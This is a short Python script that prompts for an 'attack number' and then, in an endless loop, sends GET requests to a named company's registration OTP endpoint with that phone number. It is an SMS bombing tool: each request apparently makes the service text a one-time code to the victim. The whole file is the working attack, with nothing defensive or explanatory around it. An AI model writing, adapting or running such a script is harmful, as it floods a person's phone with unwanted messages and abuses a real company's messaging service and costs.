import requests
from requests.structures import CaseInsensitiveDict

number  = str(input("[>] Heii Mr : apNar aTTack NumBer DiN: "))

url = "http://lpin.dev.mpower-social.com:6001/usermodule/otp_mobile/?mobile_no="+number+"&email=&verification_type=registration"


while True:
    print(requests.get(url).text)